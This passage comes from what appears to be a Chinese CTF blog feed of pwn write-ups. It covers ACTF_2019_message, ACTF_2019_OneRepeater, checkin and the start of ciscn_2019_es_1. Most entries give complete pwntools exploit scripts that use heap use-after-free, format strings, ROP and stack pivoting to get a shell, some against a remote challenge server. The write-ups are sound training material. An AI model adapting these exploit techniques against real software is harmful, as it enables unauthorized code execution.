        <content type="html"><![CDATA[<p>有uaf漏洞，但是打印的话会检查size，所以不能简单地uaf</p><p><img src="https://i0.imgs.ovh/2024/03/04/OYMIU.png" alt="image-20240305192928168"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x200</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x200</span>,p64(<span class="number">0x60204c</span>))</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">'aaaa'</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2024/03/04/OYkHR.png" alt="image-20240305194658879"></p><p>成功控制堆指针</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(1)+p64(0)+b'\x00'*4+p64(0x200)+p64(0x60204c)+p64(0)*20</span><br><span class="line"></span><br><span class="line">add(0x200,payload)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2024/03/04/OYScj.png" alt="image-20240305201228735"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">8</span>) </span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2024/03/04/OYQSJ.png" alt="image-20240305201734649"></p><h5 id="add的大小是0x80，保证了满的时侯的那个bin放在unsorted-bin，最后两个倒序释放，防止和top-chunk合并"><a href="#add的大小是0x80，保证了满的时侯的那个bin放在unsorted-bin，最后两个倒序释放，防止和top-chunk合并" class="headerlink" title="add的大小是0x80，保证了满的时侯的那个bin放在unsorted bin，最后两个倒序释放，防止和top chunk合并"></a>add的大小是0x80，保证了满的时侯的那个bin放在unsorted bin，最后两个倒序释放，防止和top chunk合并</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">7</span>)</span><br></pre></td></tr></tbody></table></figure><p>堆7指针是main_arena+96</p><p><img src="https://i0.imgs.ovh/2024/03/04/OYJC9.png" alt="image-20240305202521878"></p><p>我试了这种方法也可以show出来，不过edit的时候不能sendline，不然会覆盖掉一个字节，导致show的地址出错</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+<span class="string">b'\x00'</span>*<span class="number">4</span>+p64(<span class="number">0x200</span>)+p64(<span class="number">0x60204c</span>)+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br></pre></td></tr></tbody></table></figure><p>这里因为用sendline所以出错了</p><p><img src="https://i0.imgs.ovh/2024/03/04/O875W.png" alt="image-20240305203854218"></p><p>或者用师傅的做法，不过我的更简单</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">'aaaaaaa'</span>) <span class="comment">#堆8，会在unsorted bin里拿</span></span><br><span class="line">show(<span class="number">8</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2024/03/05/QAzk0.png" alt="image-20240306185549924"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">'The message: aaaaaaa'</span>)</span><br><span class="line">main_arena=u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">224</span> <span class="comment">#这里减0x80再减96</span></span><br><span class="line"><span class="comment">#libc2.23和2.27都是__malloc_hook=main_arena-0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'main_'</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">base=main_arena-<span class="number">0x10</span>-libc.sym[<span class="string">'__malloc_hook'</span>]</span><br></pre></td></tr></tbody></table></figure><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+<span class="string">b'\x00'</span>*<span class="number">4</span>+p64(<span class="number">0x200</span>)+p64(<span class="number">0x60204c</span>)+p64(<span class="number">0x80</span>)+p64(binsh)+p64(<span class="number">0x80</span>)+p64(free_hook)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2024/03/05/QA4wm.png" alt="image-20240306190111092"></p><p>最后有个地方就是free(1)会报错，得分开或者手动</p><p>exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r=remote("node5.buuoj.cn",29647)</span></span><br><span class="line">r=process(<span class="string">"./ACTF_2019_message"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context(log_level=<span class="string">'debug'</span>,arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./ACTF_2019_message'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">nu</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">'choice: '</span>, <span class="built_in">str</span>(nu))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'length of message:\n'</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">'input the message:\n'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'you want to delete:\n'</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'you want to edit:\n'</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">'edit the message:\n'</span>, content )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'want to display:\n'</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">'aaaa'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">'aaaa'</span>) <span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x200</span>,p64(<span class="number">0x60204c</span>))</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+<span class="string">b'\x00'</span>*<span class="number">4</span>+p64(<span class="number">0x200</span>)+p64(<span class="number">0x60204c</span>)+p64(<span class="number">0</span>)*<span class="number">20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x200</span>,payload) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">8</span>) </span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'aaaaaaa'</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">r.recvuntil(<span class="string">'The message: aaaaaaa'</span>)</span><br><span class="line">main_arena=u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">224</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'main_'</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">base=main_arena-<span class="number">0x10</span>-libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook=base+libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">system=base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh=base+ <span class="built_in">next</span>(libc.search(<span class="string">b'/bin/sh'</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system))</span><br><span class="line">payload=p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+<span class="string">b'\x00'</span>*<span class="number">4</span>+p64(<span class="number">0x200</span>)+p64(<span class="number">0x60204c</span>)+p64(<span class="number">0x80</span>)+p64(binsh)+p64(<span class="number">0x80</span>)+p64(free_hook)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">r.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'you want to delete:\n'</span>,<span class="string">'1'</span>)</span><br><span class="line"><span class="comment"># 有时候得手动free(1),不然打不通，很离谱</span></span><br><span class="line"><span class="comment">#free(1)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ACTF_2019_OneRepeater</title>
      <link href="//posts/319d974/"/>
      <url>//posts/319d974/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/01/78XMV.png" alt="image-20240302161950112"></p><h5 id="有可读可写可执行段，是道格式化字符串题，用shellcode做"><a href="#有可读可写可执行段，是道格式化字符串题，用shellcode做" class="headerlink" title="有可读可写可执行段，是道格式化字符串题，用shellcode做"></a>有可读可写可执行段，是道格式化字符串题，用shellcode做</h5><p><img src="https://i0.imgs.ovh/2024/03/01/78V9I.png" alt="image-20240302162059697"></p><p>1输入，会打印变量的栈地址，2格式化，可多次格式化，返回地址得在原来的基础上加0x10，因为这里leave以后并没有立即ret,而是lea     esp, [ecx-4]，调试发现时是add esp, 0x10，所以ret_addr=0x408+0x10+4</p><p><img src="https://i0.imgs.ovh/2024/03/01/78xet.png" alt="image-20240302165416987"></p><p>exp</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"node5.buuoj.cn"</span>,<span class="number">29221</span>)</span><br><span class="line"><span class="comment">#p=process("./ACTF_2019_OneRepeater")</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context(log_level=<span class="string">'debug'</span>,arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">16</span></span><br><span class="line">p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">addr = <span class="built_in">int</span>(p.recv(<span class="number">8</span>).strip(), <span class="number">16</span>)</span><br><span class="line">ret_addr=addr+<span class="number">0x418</span>+<span class="number">4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'addr'</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">payload=p32(ret_addr)+b'%'+str(addr%65536-4).encode()+b'c'+b'%16$hn'</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">p.sendlineafter('3) Exit','2')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.sendlineafter('3) Exit','1')</span></span><br><span class="line"><span class="string">payload=p32(ret_addr+2)+b'%'+str(addr//65536-4).encode()+b'c'+b'%16$hn'</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload=p32(ret_addr)+p32(ret_addr+<span class="number">2</span>)+<span class="string">b'%'</span>+<span class="built_in">str</span>(addr%<span class="number">65536</span>-<span class="number">8</span>).encode()+<span class="string">b'c'</span>+<span class="string">b'%16$hn'</span>+<span class="string">b'%'</span>+<span class="built_in">str</span>(addr//<span class="number">65536</span>-addr%<span class="number">65536</span>).encode()+<span class="string">b'c%17$hn'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">'3) Exit'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'3) Exit'</span>,<span class="string">'1'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'3) Exit'</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>checkin</title>
      <link href="//posts/e1631c91/"/>
      <url>//posts/e1631c91/</url>
      
        <content type="html"><![CDATA[<h5 id="挺有意思的一道栈迁移"><a href="#挺有意思的一道栈迁移" class="headerlink" title="挺有意思的一道栈迁移"></a>挺有意思的一道栈迁移</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7XZ5K.png" alt="image-20240229143947006"></p><h5 id="s1是全局变量，这里写rop泄露got表地址"><a href="#s1是全局变量，这里写rop泄露got表地址" class="headerlink" title="s1是全局变量，这里写rop泄露got表地址"></a>s1是全局变量，这里写rop泄露got表地址</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7Xnr2.png" alt="image-20240229144209910"></p><h5 id="为了再一次执行程序，rop后面接的不是puts-plt"><a href="#为了再一次执行程序，rop后面接的不是puts-plt" class="headerlink" title="为了再一次执行程序，rop后面接的不是puts_plt"></a>为了再一次执行程序，rop后面接的不是puts_plt</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7XpyV.png" alt="image-20240229144608441"></p><h5 id="而是调用puts函数的地址，既能泄露got表地址，又能再执行一次程序。"><a href="#而是调用puts函数的地址，既能泄露got表地址，又能再执行一次程序。" class="headerlink" title="而是调用puts函数的地址，既能泄露got表地址，又能再执行一次程序。"></a>而是调用puts函数的地址，既能泄露got表地址，又能再执行一次程序。</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7XMJI.png" alt="image-20240229144545776"></p><h5 id="buf只能溢出到rbp，但是有两次leave，一个是sub-4018C7函数里的"><a href="#buf只能溢出到rbp，但是有两次leave，一个是sub-4018C7函数里的" class="headerlink" title="buf只能溢出到rbp，但是有两次leave，一个是sub_4018C7函数里的"></a>buf只能溢出到rbp，但是有两次leave，一个是sub_4018C7函数里的</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7rKsK.png" alt="image-20240229151653874"></p><h5 id="上一个函数结束后到sub-401876函数里的，刚好能执行两次leave。"><a href="#上一个函数结束后到sub-401876函数里的，刚好能执行两次leave。" class="headerlink" title="上一个函数结束后到sub_401876函数里的，刚好能执行两次leave。"></a>上一个函数结束后到sub_401876函数里的，刚好能执行两次leave。</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7rbi2.png" alt="image-20240229151743757"></p><h5 id="不过这里-unsigned-int-sub-401974-buf-属实不太懂，太抽象了，也不知道它具体是怎么检查的"><a href="#不过这里-unsigned-int-sub-401974-buf-属实不太懂，太抽象了，也不知道它具体是怎么检查的" class="headerlink" title="不过这里(unsigned int)sub_401974(buf)属实不太懂，太抽象了，也不知道它具体是怎么检查的"></a>不过这里(unsigned int)sub_401974(buf)属实不太懂，太抽象了，也不知道它具体是怎么检查的</h5><h5 id="两次的payload不太一样。"><a href="#两次的payload不太一样。" class="headerlink" title="两次的payload不太一样。"></a>两次的payload不太一样。</h5><h5 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)</span><br><span class="line">p.sendafter(<span class="string">'&gt;'</span>,payload1)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b'admin\x00\x00\x00'</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(bss)</span><br><span class="line">p.sendafter(<span class="string">'Pass'</span>,payload2)</span><br></pre></td></tr></tbody></table></figure><h5 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">b'admin\x00\x00\x00'</span>*<span class="number">3</span>+p64(one_gadget)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">'&gt;'</span>,payload1)</span><br><span class="line">payload2=<span class="string">b'admin\x00\x00\x00'</span>*<span class="number">4</span>+p64(bss+<span class="number">0x10</span>)</span><br><span class="line">p.sendafter(<span class="string">'Pass'</span>,payload2)</span><br></pre></td></tr></tbody></table></figure><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"node5.buuoj.cn"</span>,<span class="number">25691</span>)</span><br><span class="line"><span class="comment">#p=process("./login_pro")</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">'./libc.So.6'</span>)</span><br><span class="line">bss=<span class="number">0x602400</span></span><br><span class="line">pop_rdi=<span class="number">0x401ab3</span></span><br><span class="line">puts_plt=<span class="number">0x4018b5</span></span><br><span class="line">puts_got=<span class="number">0x602028</span></span><br><span class="line">payload1=<span class="string">b'admin\x00\x00\x00'</span></span><br><span class="line">payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)</span><br><span class="line">p.sendafter(<span class="string">'&gt;'</span>,payload1)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b'admin\x00\x00\x00'</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(bss)</span><br><span class="line">p.sendafter(<span class="string">'Pass'</span>,payload2)</span><br><span class="line">p.recvuntil(<span class="string">'BaileGeBai\n'</span>)</span><br><span class="line">puts_got=u64(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_got))</span><br><span class="line">base=puts_got-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">one=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget=base+one[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b'admin\x00\x00\x00'</span>*<span class="number">3</span>+p64(one_gadget)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">'&gt;'</span>,payload1)</span><br><span class="line">payload2=<span class="string">b'admin\x00\x00\x00'</span>*<span class="number">4</span>+p64(bss+<span class="number">0x10</span>)</span><br><span class="line">p.sendafter(<span class="string">'Pass'</span>,payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_es_1</title>
      <link href="//posts/90ce1974/"/>
      <url>//posts/90ce1974/</url>
      
        <content type="html"><![CDATA[<h4 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a>ciscn_2019_es_1</h4><h4 id="checksec一下，保护全开"><a href="#checksec一下，保护全开" class="headerlink" title="checksec一下，保护全开"></a>checksec一下，保护全开</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJtxT.png" alt="image-20230921162920468"></p><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add<img src="https://i0.imgs.ovh/2024/01/22/sJzLl.png" alt="image-20230921163026621"></h4><h4 id="show函数，可以输出我们想要的地址然后算偏移"><a href="#show函数，可以输出我们想要的地址然后算偏移" class="headerlink" title="show函数，可以输出我们想要的地址然后算偏移"></a>show函数，可以输出我们想要的地址然后算偏移</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJgZp.png" alt="image-20230921163115792"></p><h4 id="delete函数，没有把指针置零，存在UAF漏洞"><a href="#delete函数，没有把指针置零，存在UAF漏洞" class="headerlink" title="delete函数，没有把指针置零，存在UAF漏洞"></a>delete函数，没有把指针置零，存在UAF漏洞</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJcDR.png" alt="image-20230921163210886"></p><h4 id="过程虽然理清，但仍然有点懵逼。"><a href="#过程虽然理清，但仍然有点懵逼。" class="headerlink" title="过程虽然理清，但仍然有点懵逼。"></a>过程虽然理清，但仍然有点懵逼。</h4><h4 id="先创三个堆"><a href="#先创三个堆" class="headerlink" title="先创三个堆"></a>先创三个堆</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>,<span class="string">"AAAA"</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"AAAA"</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"bin/sh"</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></tbody></table></figure><h4 id="libc是2-27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main-arena-96这个地址，show函数把它输出出来并算出偏移量并算出free-hook的地址和system函数的地址。"><a href="#libc是2-27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main-arena-96这个地址，show函数把它输出出来并算出偏移量并算出free-hook的地址和system函数的地址。" class="headerlink" title="libc是2.27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main_arena+96这个地址，show函数把它输出出来并算出偏移量并算出free_hook的地址和system函数的地址。"></a>libc是2.27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main_arena+96这个地址，show函数把它输出出来并算出偏移量并算出free_hook的地址和system函数的地址。</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJR7N.png" 